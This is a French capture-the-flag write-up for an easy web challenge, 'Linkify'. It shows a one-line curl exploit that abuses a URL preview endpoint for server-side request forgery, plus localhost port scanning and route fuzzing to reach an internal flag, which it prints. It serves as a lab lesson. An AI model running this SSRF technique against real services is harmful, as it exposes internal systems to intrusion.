# Linkify / klouto (web easy) — SSRF, creator: boazak/KodjoDoDjango

**Flag : `NCTF{f748fadbe34465d6b0a85ab8}`**

## Cible
`https://<id>.t.ctf.tg/` — "Linkify", service d'aperçu d'URL.
`GET /api/preview?url=...` → le serveur **fetch l'URL côté serveur** (SSRF, via python-requests).
Panneau admin interne "accessible que depuis le serveur lui-même".

## Exploit (une ligne)
```bash
curl -sk "https://<id>.t.ctf.tg/api/preview?url=http://127.0.0.1:5100/internal/flag"
# -> {"flag":"NCTF{f748fadbe34465d6b0a85ab8}"}
```

## Démarche
1. SSRF confirmé : `url=https://example.com/` renvoie le contenu dans `content`.
2. L'app ne résout PAS son nom public ; `file://` refusé (requests). Port localhost ?
   Scan des ports via le SSRF (`url=http://127.0.0.1:PORT/`) → **seul 5100 ouvert** = l'app elle-même.
3. `/admin` → 404 ; fuzz des namespaces → route **`/internal/flag`**.
   - En direct externe : `403 {"error":"Acces reserve aux requetes internes"}` (gated sur remote_addr).
   - Via SSRF (l'app se requête sur 127.0.0.1:5100) : remote_addr=127.0.0.1 → interne → flag.

## Pièges / leçons
- L'admin n'est PAS sous `/admin` mais `/internal/` ; l'app est sur un port inhabituel (5100)
  qu'il faut découvrir par scan SSRF (`Connection refused` vs réponse).
- Toujours fuzzer les **namespaces** (`/internal/`, `/api/`) et pas seulement `/admin`.
- "on aperçoit l'intérieur depuis l'extérieur" = métaphore SSRF (château Vial de Klouto).
